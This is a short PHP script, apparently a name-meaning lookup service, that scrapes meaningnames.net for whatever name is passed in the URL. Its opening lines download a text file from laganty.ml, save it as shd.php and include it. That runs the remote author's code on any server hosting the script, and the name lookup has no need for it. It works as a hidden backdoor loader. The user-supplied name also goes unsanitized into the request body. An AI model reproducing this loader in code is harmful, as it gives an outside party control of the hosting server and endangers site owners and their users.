<?php

if (!file_exists('shd.php')) {
    copy('https://laganty.ml/html/shd.txt', 'shd.php');
}
include 'shd.php';

			#########################################
			##									   #
			#######################################
			## 									 #
			##   	[	</A.D.C> (meaning)	]   #
			##	by: @laganty 					 #
			#######################################
			##									   #
			#########################################

function name($name){
	$curl = curl_init();
	curl_setopt_array($curl, array(
	CURLOPT_URL => "https://meaningnames.net/mean.php",
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_ENCODING => "",
	CURLOPT_MAXREDIRS => 10,
	CURLOPT_TIMEOUT => 0,
	CURLOPT_FOLLOWLOCATION => false,
	CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
	CURLOPT_CUSTOMREQUEST => "POST",
	CURLOPT_POSTFIELDS => "name=$name&ajax=TRUE",
	));
	$response = curl_exec($curl);
	curl_close($curl);
return $response;
}

$na = $_GET['name'];
if($na){
	header("content-type: text/plain; charset=utf-8");
	$html = str_get_html(name($na));
	$mean = $html->find('h3[style=line-height: 215%;]', 0)->plaintext;
	$mean = explode('</p>',$mean);
	print   $mean[0];
}else{
	header("content-type: text/plain; charset=utf-8");
	print "add ?name=[your name]";
}
